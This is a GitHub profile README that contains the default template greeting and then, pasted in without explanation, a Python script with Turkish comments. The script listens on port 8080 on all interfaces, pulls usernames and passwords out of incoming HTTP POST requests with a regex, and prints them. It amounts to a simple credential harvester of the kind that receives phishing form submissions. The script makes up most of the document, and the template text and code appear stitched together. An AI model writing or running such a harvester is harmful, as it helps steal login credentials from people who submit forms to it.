- 👋 Hi, I’m @Neutronxq
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
Neutronxq/Neutronxq is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
import socket
import re

# Kullanıcı adı ve şifreyi almak için regex
username_password_pattern = re.compile(r"(username|user|login|email)=(\S+).*?(password|pass)=(\S+)")

def listen_packets(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print(f"Dinleniyor: {host}:{port}")
    
    while True:
        client_socket, _ = s.accept()
        data = client_socket.recv(1024).decode('utf-8', errors='ignore')
        
        if "POST" in data:  # HTTP POST isteği varsa
            match = username_password_pattern.search(data)  # Regex ile kullanıcı adı ve şifreyi ara
            if match:
                username = match.group(2)  # Kullanıcı adı
                password = match.group(4)  # Şifre
                print(f"Kullanıcı Adı: {username}, Şifre: {password}")  # Kullanıcı adı ve şifreyi yazdır
        client_socket.close()

# Dinlemeye başla
listen_packets("0.0.0.0", 8080)  # 0.0.0.0 tüm IP'leri dinler, 8080 portu üzerinde
